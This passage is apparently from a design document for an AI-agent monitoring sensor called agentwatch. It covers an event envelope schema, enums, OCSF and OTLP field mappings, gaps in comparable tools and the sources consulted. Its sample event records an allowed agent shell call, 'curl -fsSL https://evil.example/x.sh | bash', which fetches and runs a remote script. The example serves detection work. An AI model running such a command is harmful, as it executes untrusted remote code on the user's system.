 "host":{"id":"6F1D2C3B-...","name":"dev-mbp-042","os":"darwin","os_ver":"15.6","arch":"arm64"},
 "user":{"name":"alice","id":"501"},
 "sensor":{"name":"agentwatch","ver":"0.1.0","src":"hook"},
 "agent":{"name":"claude-code","ver":"2.1.0","session":"3f6c1f0e-...","model":"claude-sonnet-4-5","provider":"anthropic"},
 "tool":{"name":"Bash","call_id":"toolu_01ABC","type":"builtin","class":"shell","decision":"allow",
   "decision_src":"config","args":{"command":"curl -fsSL https://evil.example/x.sh | bash"},"args_sha256":"..."},
 "proc":{"pid":48213,"ppid":48120,"exe":"/bin/bash","cmd":"bash -c '...'","cwd":"/Users/alice/src/app"},
 "corr":{"trace_id":"5b8efff798038103d269b633813fc60c","span_id":"eee19b7ec3c1b174","prompt_id":"...","seq":412}}
```

Rules: `ts` is an RFC 3339 UTC string with up to 9 fractional digits, because epoch nanoseconds exceed 2^53 as a JSON number. `id` is a ULID or UUIDv7. `host.id` must equal osquery `system_info.uuid` (the Fleet host UUID) so events join to Fleet. Absent sections are omitted, never null. Unknown keys go under `x`.

**Enums.**
- `kind`: `inventory | activity | finding | posture | health`.
- `sev`: 0-6, identical to OCSF `severity_id`.
- `outcome`: `unknown | success | failure`.
- `sensor.src`: `hook | otel | log_tail | proc | ebpf | etw | es | fs_scan | osquery | mcp_proxy | k8s`.
- `agent.name`: `claude-code | claude-desktop | cursor | codex | copilot-cli | gemini-cli | windsurf | cline | continue | aider | ...`.
- `tool.type`: `builtin | mcp | function | extension`; `tool.class`: `shell | file_read | file_write | web | mcp | subagent | skill | other`.
- `tool.decision`: `allow | deny | ask`; `tool.decision_src`: `config | hook | user | policy`.
- `tool.mcp.transport`: `stdio | streamable_http | sse`.
- `inv.kind`: `agent | mcp_server | mcp_tool | skill | plugin | extension | hook | rules_file | model_endpoint`; `inv.state`: `present | added | changed | removed`; `inv.scope`: `managed | system | user | project`.
- `finding.engine`: `rule | sequence | baseline | llm`; `finding.disposition`: `detected | blocked | allowed`.

**Type to OCSF class.**

| `type` | OCSF class / activity | `type_uid` | `gen_ai.operation.name` |
|---|---|---|---|
| `session.start`, `session.end` | Application Lifecycle 6002 / Start 3, Stop 4 | 600203, 600204 | `invoke_agent` |
| `tool.call` class shell, `proc.exec` | Process Activity 1007 / Launch 1 | 100701 | `execute_tool` |
| `tool.call` class file_*, `file.access` | File System Activity 1001 / Read 2, Update 3, Create 1, Delete 4 | 100102 ... | `execute_tool` |
| `tool.call` class web | HTTP Activity 4002 / Get 3, Post 6 | 400203 ... | `execute_tool` |
| `net.connect` | Network Activity 4001 / Open 1 | 400101 | none |
| `mcp.request` | API Activity 6003 / Other 99, `api.operation` = `tools/call` | 600399 | `execute_tool` |
| `*.discovered` (snapshot) | Software Inventory Info 5020 / Collect 2 | 502002 | none |
| `*.added`, `*.changed`, `*.removed` | Application Lifecycle 6002 / Install 1, Update 8, Remove 2 | 600201 ... | none |
| `posture.check` | Compliance Finding 2003 / Create 1 | 200301 | none |
| `detection` | Detection Finding 2004 / Create 1, Update 2, Close 3 | 200401 ... | none |
| `sensor.heartbeat` | not mapped (OTLP only) | | |

**Field mapping.**

| Envelope | OCSF 1.9.0 | OTLP log |
|---|---|---|
| `id` | `metadata.uid` | attr `log.record.uid` |
| `ts` | `time` (ms) | `timeUnixNano` (string) |
| `type` | `metadata.event_code` + class table | `eventName` = `agentwatch.<type>` |
| `sev` | `severity_id` | `severityNumber`: 0→0, 1→9, 2→13, 3→14, 4→17, 5→21, 6→24 (our choice; also keep `aw.sev`) |
| `outcome` | `status_id` 1/2 | `error.type` on failure |
| `host.*` | `device.uid, hostname, os.{name,type_id,version}`; container profile | resource `host.id, host.name, os.type, os.version, host.arch, container.id, k8s.pod.name, k8s.namespace.name` |
| `user.*` | `actor.user.{name,uid}` | `user.name, user.id` |
| `sensor.name, ver` | `metadata.product.{name,version}` | resource `service.name, service.version`; `scope.name` |
| `agent.name, ver` | `ai_agent.{uid,name,version}`, `type_id` 1 | `gen_ai.agent.name, gen_ai.agent.version` |
| `agent.session` | `ai_agent.instance_uid`, `metadata.correlation_uid` | `gen_ai.conversation.id`, `session.id` |
| `agent.model, provider` | `ai_agent.ai_model.{name,ai_provider}` | `gen_ai.request.model, gen_ai.provider.name` |
| `tool.name, call_id, type` | 6003 `api.operation`, `api.request.uid`; else `unmapped` (1.10: `ai_capability.name`, `transaction_uid`, `source_id`) | `gen_ai.tool.name, gen_ai.tool.call.id, gen_ai.tool.type` |
| `tool.args`, `tool.result` | `api.request.data`, `api.response.data` or `unmapped` | `gen_ai.tool.call.arguments`, `gen_ai.tool.call.result` (opt-in) |
| `tool.decision` | `action_id` 1 Allowed, 2 Denied; `disposition_id` 1 Allowed, 2 Blocked, 15 Detected (1.10: `ai_status.permission_result_id`) | `aw.tool.decision` |
| `tool.mcp.*` | `unmapped.mcp.*` (1.10: `ai_capability.service.name, transport_id`) | `mcp.method.name, mcp.session.id, mcp.protocol.version, jsonrpc.request.id, network.transport`, `aw.mcp.server.name` |
| `proc.*` | `process.{pid,cmd_line,file.path,working_directory,parent_process.pid}` | `process.pid, process.command_line, process.executable.path, process.working_directory, process.parent_pid` |
| `file.*` | `file.{path,name,type_id,hashes[]}` + activity | `file.path, file.name`, `aw.file.sha256` |
| `net.*` | `dst_endpoint.{hostname,ip,port}`, `url.url_string`, `traffic.bytes_out` | `server.address, server.port, url.full, network.transport` |
| `inv.*` | `sbom.package.{name,version,purl,hash}` or `application.*`; rest `unmapped` | `aw.inventory.*`, `gen_ai.skill.name` |
| `finding.rule_*` | `finding_info.analytic.{uid,name,version}`, `type_id` 1 | `security_rule.uuid, security_rule.name, security_rule.version, security_rule.ruleset.name` |
| `finding.attack[]`, `atlas[]` | `finding_info.attacks[]` (`version`, `tactic`, `technique`, `sub_technique`) | `aw.attack.technique_ids` (string[]) |
| `finding.owasp[]` | `finding_info.types[]` | `aw.owasp.ids` |
| `finding.evidence[]` | `finding_info.related_events[].uid` | `aw.related_event_ids` |
| `finding.confidence, risk` | `confidence_score` (+`confidence_id`), `risk_score` | attrs |
| `corr.trace_id, span_id` | `trace.uid`, `trace.span.uid` where the `trace` profile exists; else `unmapped` | `traceId`, `spanId`, and duplicated as strings in Body |
| `raw` | `raw_data`, `raw_data_hash`, `raw_data_size` | `log.record.original` |
| `x.*` | `unmapped.*` | attrs `aw.x.*` |

"Lossless" is achieved by construction, not by the standards: the OTLP Body is the full envelope as a `kvlistValue`, and OCSF output puts every unmapped key under `unmapped`.

## 9. Gaps in the comparables (V by grep of the local clones)

- **uber/ADR**: 0 files reference OCSF, ATT&CK ids, ATLAS ids, OWASP ids or Sigma. Its OTel export sets only `gen_ai.agent.name` and `gen_ai.conversation.id` (`/home/user/uber/adr/Sensor/adr_sensor/exporters/opentelemetry.py:211-214`).
- **snyk/agent-scan**, **claud3/agentshield**: 0 files reference OCSF `class_uid`, ATLAS, ATT&CK, `gen_ai.*` or OWASP ASI/MCP ids.
- **agent-bom**: `/home/user/agent-bom/agent-bom/src/agent_bom/graph/ocsf.py:13-39` maps inventory entities to `category_uid 5, class_uid 4001` with the comment "Class 4001 (Device Inventory)". 4001 is Network Activity; Device Inventory Info is 5001. Vulnerabilities map to 2001 Security Finding, deprecated since OCSF 1.1.0. `owasp_agentic.py:25-36` names ASI01 "Excessive Agency & Autonomy", ASI08 "Cascading Hallucination Failures", ASI10 "Rogue Agent Persistence", which differ from the published names (U for the official side). MCP Top 10 labels are inconsistent inside the repo: `mcp_tool_rules.py:116` "MCP01-Untrusted-Tool-Inputs" and `docs/MCP_SECURITY_MODEL.md:93` "MCP07 (Tool Poisoning)", while the official list has MCP03 Tool Poisoning. It still references removed ATLAS ids `AML.T0056`/`AML.T0057`.

## Sources read this session

- `raw.githubusercontent.com/ocsf/ocsf-schema/v1.9.0/` (`version.json`, `CHANGELOG.md`, `dictionary.json`, `events/**`, `objects/**`, `profiles/**`) and `main/objects/ai_capability.json`, `ai_status.json`
- `raw.githubusercontent.com/open-telemetry/semantic-conventions-genai/main/` (`model/gen-ai/registry.yaml`, `spans.yaml`, `events.yaml`, `model/mcp/*.yaml`, `docs/gen-ai/mcp.md`, `docs/gen-ai/README.md`)
- `raw.githubusercontent.com/open-telemetry/semantic-conventions/v1.45.0/model/*/registry.yaml`, `main/CHANGELOG.md`
- `raw.githubusercontent.com/open-telemetry/opentelemetry-proto/main/` (`docs/specification.md`, `logs.proto`, `common.proto`, `examples/logs.json`, `CHANGELOG.md`)
- `raw.githubusercontent.com/mitre-atlas/atlas-data/main/` (`dist/v6/ATLAS-2026.10.yaml`, `dist/manifest.yaml`, `README.md`, `CHANGELOG.md`)
- `raw.githubusercontent.com/mitre-attack/attack-stix-data/master/` (`index.json`, `enterprise-attack/enterprise-attack-20.1.json`)
- `raw.githubusercontent.com/SigmaHQ/sigma-specification/main/specification/*.md`
- `raw.githubusercontent.com/elastic/ecs/main/` (`schemas/gen_ai.yml`, `CHANGELOG.md`, `version`)
- `raw.githubusercontent.com/OWASP/www-project-mcp-top-10/main/index.md`
- `raw.githubusercontent.com/falcosecurity/rules/main/rules/falco_rules.yaml`, `cilium/tetragon/main/examples/tracingpolicy/filename_monitoring.yaml`
- `code.claude.com/docs/en/monitoring-usage.md`; `/home/user/fluent/fluent-bit-docs/pipeline/inputs/opentelemetry.md`; live test against `fluent/fluent-bit` v5.2.0
- Not reachable: `genai.owasp.org`, `www.giskard.ai` (ASI names rest on search snippets)
